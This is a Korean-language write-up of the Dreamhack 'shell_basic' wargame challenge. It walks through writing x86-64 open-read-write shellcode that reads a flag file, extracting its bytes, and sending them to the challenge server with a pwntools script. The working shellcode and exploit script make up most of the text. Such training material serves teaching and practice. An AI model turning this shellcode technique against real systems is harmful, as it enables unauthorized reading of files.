# [Dreamhack] shell_basic

---

## **문제 설명**

## **Description**

- **입력한 셸코드를 실행하는 프로그램이 서비스로 등록되어 작동하고 있습니다.
`main` 함수가 아닌 다른 함수들은 execve, execveat 시스템 콜을 사용하지 못하도록 하며, 풀이와 관련이 없는 함수입니다.**
- **flag 파일의 위치와 이름은 `/home/shell_basic/flag_name_is_loooooong`입니다.**
- 해당 문자열을 리틀엔디안 형식으로 작성하면 다음과 같다.
    - 676E6F6F6F6F6F6F
    - 6C5F73695F656D61
    - 6E5F67616C662F63
    - 697361625F6C6C65
    - 68732F656D6F682F

### 1. 해당 문자열을 참조한 orw 셸코드를 작성하면 아래와 같다.

```c
// File name: shell_basic.c
// Compile: gcc -o shell_basic shell_basic.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"
    
    "push 0x0\n"      # push 전에 null 값을 넣어주어야함.
    "mov rax, 0x676E6F6F6F6F6F6F \n"
    "push rax\n"
    "mov rax, 0x6C5F73695F656D61 \n"
    "push rax\n"
    "mov rax, 0x6E5F67616C662F63 \n"
    "push rax\n"
    "mov rax, 0x697361625F6C6C65 \n"
    "push rax\n"
    "mov rax, 0x68732F656D6F682F \n"
    "push rax\n"
    "mov rdi, rsp    # rdi = '/home/shell_basic/flag_name_is_loooooong'\n"
    "xor rsi, rsi    # rsi = 0 ; RD_ONLY\n"
    "xor rdx, rdx    # rdx = 0\n"
    "mov rax, 2      # rax = 2 ; syscall_open\n"
    "syscall         # open('/tmp/flag', RD_ONLY, NULL)\n"
    "\n"
    "mov rdi, rax      # rdi = fd\n"
    "mov rsi, rsp\n"
    "sub rsi, 0x30     # rsi = rsp-0x30 ; buf\n"
    "mov rdx, 0x30     # rdx = 0x30     ; len\n"
    "mov rax, 0x0      # rax = 0        ; syscall_read\n"
    "syscall           # read(fd, buf, 0x30)\n"
    "\n"
    "mov rdi, 1        # rdi = 1 ; fd = stdout\n"
    "mov rax, 0x1      # rax = 1 ; syscall_write\n"
    "syscall           # write(fd, buf, 0x30)\n"
    "\n"
    "xor rdi, rdi      # rdi = 0\n"
    "mov rax, 0x3c	   # rax = sys_exit\n"
    "syscall		   # exit(0)");

void run_sh();

int main() { run_sh(); }
```

### 2. 오브젝트 파일로 컴파일

```c
gcc -c -o shell_basic.o shell_basic.c -masm=intel
```

```c
objdump -d shell_basic.o // 디버깅
```

### 3. 바이너리 코드 추출

- 오브젝트 파일에서 `.text` 섹션을 추출하여 바이너리 파일로 저장합니다.

```c
objcopy --dump-section .text=shell_basic.bin shell_basic.o
```

### 4. 바이너리 코드 변환(추출)

- 바이너리 파일을 헥사 문자열로 변환하고 쉘코드 형식으로 변환합니다.

```c
xxd -p shell_basic.bin | tr -d '\n' | sed 's/../\\x&/g'
```

- 변환된 문자열에 `main` 함수에 헥사값도 포함이 되었음, 해당 부분을 삭제해주어야함

![Untitled](%5BDreamhack%5D%20shell_basic%201069fc81cb484dbb921219115ac6e7bd/Untitled.png)

```c
\x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xc7\xc0\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\x48\xc7\xc2\x30\x00\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05\x48\x31\xff\x48\xc7\xc0\x3c\x00\x00\x00\x0f\x05
```

### 5. Python Exploit 함수 작성

- 추출한 쉘코드 문자열로 Exploit을 시도 아래와 같이 `Flag` 를 획득해볼 수 있습니다.
- 입력한 `shellcode` 앞에 문자열과 바이트를 구분하기 위해 `b` 를 추가해줘야함

```c
from pwn import *

context.arch="amd64"

p = remote('host3.dreamhack.games', 11881)
shellcode=b"\x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xc7\xc0\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\x48\xc7\xc2\x30\x00\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05\x48\x31\xff\x48\xc7\xc0\x3c\x00\x00\x00\x0f\x05"
p.sendlineafter('shellcode:',shellcode)
data=p.recvline()
print(data)

```

![Untitled](%5BDreamhack%5D%20shell_basic%201069fc81cb484dbb921219115ac6e7bd/Untitled%201.png)